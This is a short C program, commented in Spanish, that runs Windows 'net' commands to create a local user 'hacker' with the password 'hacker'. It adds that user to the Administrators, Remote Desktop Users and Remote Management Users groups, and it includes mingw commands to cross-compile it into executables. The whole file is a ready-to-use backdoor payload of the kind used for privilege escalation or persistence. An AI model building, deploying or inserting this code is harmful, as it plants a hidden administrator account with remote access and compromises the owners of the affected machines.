#include <stdlib.h>

/*
  Crea usuario hacker:hacker y lo añade a administradores y 
  le da acceso RDP y WinRM

  Para compilar
  x86_64-w64-mingw32-gcc -static createUser.c -o createUser.exe
  i686-w64-mingw32-gcc -static createUser.c -o createUser32.exe
*/

int main ()
{
  int i;
  i = system ("net user hacker hacker /add");
  i = system ("net localgroup \"Administrators\" hacker /add");
  i = system ("net localgroup \"Remote Desktop Users\" hacker /add");
  i = system ("net localgroup \"Remote Management Users\" hacker /add");
  return 0;
}
